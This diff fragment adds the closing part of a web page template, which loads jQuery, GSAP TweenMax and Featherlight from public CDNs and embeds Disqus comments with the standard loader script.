+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+<script type="text/javascript">
+    var disqus_shortname = 'oneplus';
+
+    (function(){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+</body>
+
+</html>
